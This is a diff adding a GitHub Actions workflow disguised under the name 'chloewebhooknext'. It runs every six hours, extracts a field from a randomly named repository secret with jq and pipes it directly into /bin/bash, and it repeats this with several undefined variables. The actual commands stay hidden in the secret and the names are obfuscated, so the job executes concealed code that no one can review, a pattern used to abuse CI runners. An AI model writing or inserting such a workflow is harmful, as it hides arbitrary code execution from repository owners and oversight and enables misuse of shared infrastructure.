@@ -1,0 +1,22 @@
+name: chloewebhooknext
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chloewebhooknext
+        env:
+          uvgpi3: ${{ secrets.uvgpi3 }}
+        run: |
+          echo $uvgpi3 | jq -r .udza28265 | /bin/bash
+          echo $yq4 | jq -r .gvgvv1659 | /bin/bash
+          echo $ehrsn8536 | jq -r .jjx914 | /bin/bash
+          echo $u12927 | jq -r .suny859 | /bin/bash
+          echo $f85383 | jq -r .f83 | /bin/bash
+
